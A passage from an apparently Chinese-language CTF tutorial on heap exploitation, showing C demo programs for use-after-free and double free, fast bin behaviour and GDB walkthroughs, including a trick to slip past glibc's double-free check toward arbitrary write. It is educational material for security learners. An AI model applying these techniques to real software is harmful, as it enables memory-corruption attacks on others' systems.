  a <span class="token operator">-&gt;</span> myname <span class="token operator">=</span> <span class="token string">"I can also use it"</span><span class="token punctuation">;</span>
  a <span class="token operator">-&gt;</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token string">"this is my function"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  
  <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
  
  <span class="token comment">// free without modify</span>
  a <span class="token operator">-&gt;</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token string">"I can also use it"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  
  <span class="token comment">// free with modify</span>
  a <span class="token operator">-&gt;</span> func <span class="token operator">=</span> printmyname<span class="token punctuation">;</span>
  a <span class="token operator">-&gt;</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token string">"this is my function"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  
  <span class="token comment">// set NULL</span>
  a <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"this pogram will crash...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  a <span class="token operator">-&gt;</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token string">"can not be printed..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿è¡Œç»“æœï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A829.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨29.png"></p><ul><li><p>å³ä½¿ <code>free</code> æ‰äº† <code>chunk a</code>ï¼Œæˆ‘ä»¬ä¾ç„¶å¯ä»¥é€šè¿‡ <code>a -&gt; func("I can also use it")</code> è°ƒç”¨ <code>myprint()</code> æ‰“å°è¾“å‡º</p></li><li><p>å³ä½¿ <code>free</code> æ‰äº† <code>chunk a</code>ï¼Œå°† <code>a -&gt; func</code> ä¿®æ”¹ä¸º <code>printmyname()</code>ï¼Œä¹Ÿå¯ä»¥æ­£å¸¸ä½¿ç”¨ <code>printf("call print my name\n")</code> åŠŸèƒ½</p></li><li><p>ä½†æ˜¯å½“ <code>chunk a</code> è¢«ç½®ä¸º NULL åï¼Œ<code>a -&gt; func("can not be printed...")</code> ä¾¿æ— æ³•ä½¿ç”¨</p></li></ul><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬é€šè¿‡ GDB è°ƒè¯•åˆ†æä¸€ä¸‹æ•´ä¸ªè¿‡ç¨‹</p><p>åœ¨æ‰§è¡Œ <code>free(a)</code> ä¹‹å‰ï¼Œå †å¸ƒå±€å¦‚ä¸‹ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A830.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨30.png"></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A831.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨31.png"></p><p>æ‰§è¡Œ <code>free(a)</code> åï¼Œ<code>chunk a</code> è¢«ç½®äº <code>fast bin</code> ä¸­</p><p><strong><code>myname</code> æŒ‡é’ˆè¢«ç½®ä¸º NULLï¼Œä½† <code>func</code> æŒ‡é’ˆæœªå‘ç”Ÿå˜åŒ–</strong>ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A832.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨32.png"></p><p>æ­¤æ—¶é€šè¿‡ <code>a -&gt; func("I can also use it")</code> ä¾ç„¶å¯ä»¥è°ƒç”¨ <code>myprint()</code>ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A833.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨33.png"></p><p>å½“æˆ‘ä»¬å°† <code>func</code> æŒ‡é’ˆä¿®æ”¹ä¸º <code>printmyname()</code> åï¼Œé€šè¿‡ <code>a -&gt; func("this is my function")</code> ä¹Ÿå¯ä»¥è°ƒç”¨ <code>printmyname()</code>ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A834.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨34.png"></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A835.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨35.png"></p><p>å½“æˆ‘ä»¬é€šè¿‡ <code>a = NULL</code> å°†å…¶ç½®ä¸º NULL åï¼Œ<strong>å †çš„å¸ƒå±€å¹¶æœªå‘ç”Ÿå˜åŒ–</strong>ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A836.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨36.png"></p><p>ä½†å½“æˆ‘ä»¬å†æ¬¡ä½¿ç”¨ <code>a -&gt; func("can not be printed...")</code> çš„æ—¶å€™</p><p>**ç¨‹åºä¼šç›´æ¥æŠ¥å‡ºæ®µé”™è¯¯ï¼Œè€Œä¸æ˜¯ç»§ç»­è°ƒç”¨ <code>0x4005d1</code> åœ°å€å¤„çš„ <code>printmyname()</code>**ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A837.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨37.png"></p><blockquote><p>å‘ç”Ÿæ®µé”™è¯¯çš„å…³é”®åœ¨äºï¼š</p><p>æˆ‘ä»¬å‰é¢æ‰§è¡Œ <code>a = NULL</code> çš„æ—¶å€™å°† RBP - 8 åœ°å€å¤„ç½®ä¸ºäº† 0ï¼Œå› æ­¤æ‰§è¡Œ <code>mov rax, qword ptr [rbp - 8]</code> æ—¶ RAX = 0ï¼Œæ­¤æ—¶æ‰§è¡Œ <code>mov rax, qword ptr [rax + 8]</code> è¦æ±‚ä»å†…å­˜åœ°å€ä¸º 8 çš„åœ°æ–¹å–å€¼èµ‹ç»™ RAXï¼Œæ˜¾ç„¶è¿™ä¸ªå†…å­˜åœ°å€æ˜¯é”™è¯¯çš„</p></blockquote><hr><h1 id="Fast-bin-Attack"><a href="#Fast-bin-Attack" class="headerlink" title="Fast bin Attack"></a>Fast bin Attack</h1><blockquote><p>Fast bin Attack æ˜¯ä¸€ç±»æ¼æ´çš„åˆ©ç”¨æ–¹æ³•ï¼Œæ˜¯æŒ‡æ‰€æœ‰åŸºäº <code>fast bin</code> æœºåˆ¶çš„æ¼æ´åˆ©ç”¨æ–¹æ³•</p><p>å‚è€ƒæ–‡ç« ï¼š<a target="_blank" rel="external nofollow noopener noreferrer" href="/go.html?target=aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9mYXN0YmluLWF0dGFjay8=">Fastbin Attack - CTF Wiki</a></p></blockquote><p>Fast bin Attack åˆ©ç”¨çš„å‰æï¼š</p><ul><li>å­˜åœ¨å †æº¢å‡ºã€UAF ç­‰èƒ½æ§åˆ¶ <code>chunk</code> å†…å®¹çš„æ¼æ´</li><li>æ¼æ´å‘ç”Ÿäº <code>fast bin</code> ç±»å‹çš„ <code>chunk</code> ä¸­</li></ul><p>ç”±äº <code>fast bin</code> ä½¿ç”¨å•é“¾è¡¨æ¥ç»´æŠ¤é‡Šæ”¾çš„å †å—ï¼Œå¹¶ä¸”<strong>ç”± <code>fast bin</code> ç®¡ç†çš„ <code>chunk</code> å³ä½¿è¢«é‡Šæ”¾ï¼Œå…¶ <code>next_chunk</code> çš„ <code>prev_inuse</code> ä½ä¹Ÿä¸ä¼šè¢«æ¸…ç©º</strong></p><p>ç¤ºä¾‹ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">void</span> <span class="token operator">*</span>chunk1<span class="token punctuation">,</span> <span class="token operator">*</span>chunk2<span class="token punctuation">,</span> <span class="token operator">*</span>chunk3<span class="token punctuation">;</span>
    chunk1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    chunk2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    chunk3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token comment">// è¿›è¡Œé‡Šæ”¾</span>
    <span class="token function">free</span><span class="token punctuation">(</span>chunk1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>chunk2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>chunk3<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰§è¡Œä¸‰æ¬¡ <code>free</code> è¿›è¡Œé‡Šæ”¾å</p><p>æ­¤æ—¶ä½äº <code>main_arena</code> ä¸­çš„ <code>fastbin</code> é“¾è¡¨ä¸­å·²ç»å‚¨å­˜äº†æŒ‡å‘ <code>chunk3</code> çš„æŒ‡é’ˆï¼ˆæœ€è¿‘é‡Šæ”¾ï¼‰ï¼Œå¹¶ä¸” <code>chunk3</code>ã€<code>chunk2</code>ã€<code>chunk1</code> æ„æˆäº†ä¸€ä¸ªå•é“¾è¡¨ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A851.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨51.png"></p><hr><h2 id="Double-Free"><a href="#Double-Free" class="headerlink" title="Double Free"></a>Double Free</h2><blockquote><p>Double free æŒ‡åŒä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘çš„å†…å­˜è¢« <code>free</code> ä¸¤æ¬¡</p><p>å †ä¸Šçš„æŸå—å†…å­˜è¢«é‡Šæ”¾åï¼Œå¦‚æœæ²¡æœ‰å°†æŒ‡å‘è¯¥å †å—çš„æŒ‡é’ˆæ¸…é›¶ï¼Œå°±å¯ä»¥åˆ©ç”¨ç¨‹åºçš„å…¶ä»–éƒ¨åˆ†å¯¹è¯¥å†…å­˜è¿›è¡Œå†æ¬¡çš„ <code>free</code>ï¼Œ<strong>æœ€ç»ˆå¾—åˆ°ä¸€ä¸ªå¯ç”¨çš„ç©ºé—²å—æŒ‡é’ˆï¼Œå¹¶ä¸”èƒ½å¤Ÿä¿®æ”¹å·²ç»è¢«é‡Šæ”¾çš„ç©ºé—²å—ä¸­çš„å†…å®¹</strong>ï¼Œä»è€Œåˆ©ç”¨è¿™ä¸ªæ¼æ´å®ç°<strong>ä»»æ„åœ°å€å†™</strong></p><p>å‚è€ƒæ–‡ç« ï¼š<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241598">å †åˆ©ç”¨ç³»åˆ—ä¹‹å †æ¼æ´-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å°</a></p></blockquote><p>æ€»çš„æ¥è¯´ï¼Œdouble free å°±æ˜¯é€šè¿‡ 2 æ¬¡ <code>free</code>ï¼Œ2 æ¬¡ <code>malloc</code>ï¼Œå† 1 æ¬¡ <code>free</code>ï¼Œæœ€ç»ˆå¾—åˆ°å¯ç”¨çš„ç©ºé—²å—æŒ‡é’ˆï¼Œå¹¶ä¸”å¯ä»¥ä¿®æ”¹ç©ºé—²å—ä¸­çš„å†…å®¹</p><p>è¯¦ç»†æ¥è¯´å°±æ˜¯ï¼š</p><ol><li>é¦–å…ˆä¸¤æ¬¡ <code>free</code> åŒä¸€å—åœ°å€ï¼ˆä¸¤æ¬¡ <code>free</code> ä¹‹é—´éœ€è¦å…ˆ <code>free</code> ä¸€æ¬¡å…¶ä»–çš„ <code>chunk</code> æ¥ç»•è¿‡æ£€æµ‹ï¼‰</li><li>ç„¶åå†è¿ç»­ä¸¤æ¬¡ <code>malloc</code> ç›¸åŒå¤§å°</li><li>ç„¶åå† <code>free</code> æ‰å…¶ä¸­ä¸€ä¸ª</li><li>é‚£ä¹ˆå‰©ä¸‹é‚£ä¸ªæŒ‡é’ˆæŒ‡å‘çš„å°±æ˜¯ç©ºé—²å—çš„ <code>chunk</code>ï¼Œè€Œä¸”è¿˜æ˜¯å¯ä»¥è¢«ä¿®æ”¹çš„</li></ol><p>ç¤ºä¾‹ï¼šï¼ˆ64 ä½ç¨‹åºï¼‰</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>ptr0<span class="token punctuation">,</span> <span class="token operator">*</span>ptr1<span class="token punctuation">,</span> <span class="token operator">*</span>ptr2<span class="token punctuation">;</span>

    ptr0 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// chunk1</span>
    ptr1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// chunk2</span>
    ptr2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// chunk3</span>

    <span class="token keyword">char</span> <span class="token operator">*</span>data0 <span class="token operator">=</span> <span class="token string">"00000000"</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>data1 <span class="token operator">=</span> <span class="token string">"11111111"</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>data2 <span class="token operator">=</span> <span class="token string">"22222222"</span><span class="token punctuation">;</span>

    <span class="token function">memcpy</span><span class="token punctuation">(</span>ptr0<span class="token punctuation">,</span> data0<span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>ptr1<span class="token punctuation">,</span> data1<span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   
    <span class="token function">memcpy</span><span class="token punctuation">(</span>ptr2<span class="token punctuation">,</span> data2<span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk1: ptr0 @ %p\t contains: %s\n"</span><span class="token punctuation">,</span> ptr0<span class="token punctuation">,</span> ptr0<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk2: ptr1 @ %p\t contains: %s\n"</span><span class="token punctuation">,</span> ptr1<span class="token punctuation">,</span> ptr1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk3: ptr2 @ %p\t contains: %s\n\n"</span><span class="token punctuation">,</span> ptr2<span class="token punctuation">,</span> ptr2<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">free</span><span class="token punctuation">(</span>ptr0<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>ptr1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>ptr0<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// double free</span>

    <span class="token keyword">char</span> <span class="token operator">*</span>ptr3<span class="token punctuation">,</span> <span class="token operator">*</span>ptr4<span class="token punctuation">,</span> <span class="token operator">*</span>ptr5<span class="token punctuation">;</span>

    ptr3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// chunk4</span>
    ptr4 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// chunk5</span>
    ptr5 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// chunk6</span>

    <span class="token function">memcpy</span><span class="token punctuation">(</span>ptr3<span class="token punctuation">,</span> data0<span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>ptr4<span class="token punctuation">,</span> data1<span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   
    <span class="token function">memcpy</span><span class="token punctuation">(</span>ptr5<span class="token punctuation">,</span> data2<span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk4: ptr3 @ %p\t contains: %s\n"</span><span class="token punctuation">,</span> ptr3<span class="token punctuation">,</span> ptr3<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk5: ptr4 @ %p\t contains: %s\n"</span><span class="token punctuation">,</span> ptr4<span class="token punctuation">,</span> ptr4<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk6: ptr5 @ %p\t contains: %s\n\n"</span><span class="token punctuation">,</span> ptr5<span class="token punctuation">,</span> ptr5<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">free</span><span class="token punctuation">(</span>ptr3<span class="token punctuation">)</span><span class="token punctuation">;</span>
    ptr3 <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk4: ptr3 @ %p\n"</span><span class="token punctuation">,</span> ptr3<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk6: ptr5 @ %p\n\n"</span><span class="token punctuation">,</span> ptr5<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">char</span> <span class="token operator">*</span>data3 <span class="token operator">=</span> <span class="token string">"15935728"</span><span class="token punctuation">;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>ptr5<span class="token punctuation">,</span> data3<span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk5: @ %p\t contains: %s\n\n"</span><span class="token punctuation">,</span> ptr5<span class="token punctuation">,</span> ptr5<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆ‘ä»¬é€šè¿‡ GDB è°ƒè¯•è§‚å¯Ÿä¸€ä¸‹æ•´ä¸ªæ‰§è¡Œæµç¨‹</p><p>åˆšå¼€å§‹åˆ›å»ºä¸‰ä¸ªå †å— <code>ptr0</code>ã€<code>ptr1</code> å’Œ <code>ptr2</code>ï¼Œå¹¶é€šè¿‡ <code>data0</code>ã€<code>data1</code>ã€<code>data2</code> è¿›è¡Œèµ‹å€¼ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A838.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨38.png"></p><p>æ­¤æ—¶è¾“å‡ºä¿¡æ¯ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">Chunk1<span class="token operator">:</span> ptr0 @ <span class="token number">0x602010</span>	 contains<span class="token operator">:</span> <span class="token number">00000000</span>
Chunk2<span class="token operator">:</span> ptr1 @ <span class="token number">0x602050</span>	 contains<span class="token operator">:</span> <span class="token number">11111111</span>
Chunk3<span class="token operator">:</span> ptr2 @ <span class="token number">0x602090</span>	 contains<span class="token operator">:</span> <span class="token number">22222222</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>é¦–å…ˆ <code>free</code> æ‰ <code>ptr0</code> å’Œ <code>ptr1</code>ï¼Œå®ƒä»¬éƒ½è¢«ç½®äº <code>fast bin</code> ä¸­ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A839.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨39.png"></p><p><code>ptr1</code> çš„ <code>fd</code> æŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ªç©ºé—²çš„ <code>chunk</code>ï¼Œå³ï¼š<code>ptr0</code> çš„åœ°å€</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A842.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨42.png"></p><blockquote><p>æ³¨æ„ï¼š</p><p>åœ¨å¯¹ <code>ptr0</code> çš„ double free ä¹‹é—´ï¼Œæˆ‘ä»¬ç©¿æ’äº†ä¸€ä¸ª <code>free(ptr1)</code> çš„æ“ä½œï¼Œè¿™ä¹ˆåšä¸æ˜¯æ¯«æ— æ ¹æ®çš„ï¼Œè€Œæ˜¯ä¸ºäº†ç»•è¿‡æ£€æµ‹</p><p>å› ä¸ºåœ¨ä¸åŒç‰ˆæœ¬çš„ <code>malloc</code> ä¸­ï¼Œå¯èƒ½å­˜åœ¨å¯¹ double free çš„æ£€æµ‹ï¼š<strong>å¦‚æœå½“å‰è¢«é‡Šæ”¾çš„æŒ‡é’ˆä¸æœ€åä¸€ä¸ªé‡Šæ”¾çš„å†…å­˜å—ç›¸åŒï¼Œç¨‹åºå°†åœæ­¢æ‰§è¡Œ</strong></p><p>è€Œ <code>fast bin</code> åœ¨æ‰§è¡Œ <code>free</code> çš„æ—¶å€™ä»…éªŒè¯äº† <code>main_arena</code> ç›´æ¥æŒ‡å‘çš„å—ï¼Œå³é“¾è¡¨æŒ‡é’ˆå¤´éƒ¨çš„å—ï¼Œå¯¹äºé“¾è¡¨åé¢çš„å—ï¼Œå¹¶æ²¡æœ‰è¿›è¡ŒéªŒè¯</p><p>å› æ­¤ï¼Œç»•è¿‡è¿™ä¸ªæ£€æµ‹çš„æ–¹æ³•å°±æ˜¯ï¼š<strong>åœ¨ä¸¤æ¬¡é‡Šæ”¾åŒä¸€ä¸ªæŒ‡é’ˆä¹‹é—´é‡Šæ”¾å¦ä¸€ä¸ªæŒ‡é’ˆ</strong>ï¼ˆä½†æ˜¯åœ¨ Glibc 2.27 ä¸­ï¼Œå®ƒå°†å‘½ä¸­ <code>tcache</code>ï¼Œå°±ä¸å­˜åœ¨è¿™ä¸ªé—®é¢˜ï¼‰</p></blockquote><p>ä¸ºäº†å®ç° double freeï¼Œæˆ‘ä»¬å†æ¬¡ <code>free</code> æ‰ <code>ptr0</code>ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A840.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨40.png"></p><p>æ­¤æ—¶ <code>ptr1</code> çš„ 